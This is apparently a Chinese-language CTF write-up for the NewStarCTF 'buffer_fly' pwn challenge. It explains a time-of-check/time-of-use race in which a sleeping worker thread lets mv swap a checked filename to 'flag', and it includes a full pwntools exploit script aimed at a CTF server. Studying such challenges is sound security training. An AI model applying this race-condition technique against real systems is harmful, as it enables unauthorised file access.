---
title: buffer_fly
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- race_condition

---

NewStarCTF，竞争条件，操作系统中说的共享变量的问题
<!-- more -->

程序中有ls,cat,mv三个功能。其中ls和cat是直接执行system("ls")和system("cat ...")。

不过并不能直接cat flag。程序会检查输入的文件名filename（这是一个**全局变量**，在bss段中）是否出现了"./"，该文件名是否存在。如果没有"./"且文件名存在的话，程序会新开一个线程执行cating函数。

在cating函数中会再次对文件名进行检测，如果文件名是flag的话是不会cat的，但如果不是flag的话，他会先sleep(1)休眠1s，然后再执行system("cat ...")。

这里就要用到程序中的第三个功能mv了，mv可以修改filename（这是一个**全局变量**，在bss段中）。因此如果我们**在cating线程休眠的时候，使用mv修改filename为flag**，那么就可以执行cat flag。

不过我们也要先通过前面的检测，**一开始输入的文件名不能有"./"，不能是flag，也必须要存在**。这时我们可以借助ls功能查看该目录下的文件，发现有个叫backdoor的文件，就把输入的文件名写为backdoor。

exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='cat_flag'
elf=ELF('./'+filename)
#libc=ELF('')
#p=process('./'+filename)
p=remote('node4.buuoj.cn',28600)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug():
  gdb.attach(p)
  pause()

ru('==>')
sl('2')
ru('cat.')
sl('backdoor')#an exist file
ru('==>')
sl('3')
ru('change.')
sl('flag')

itr()
```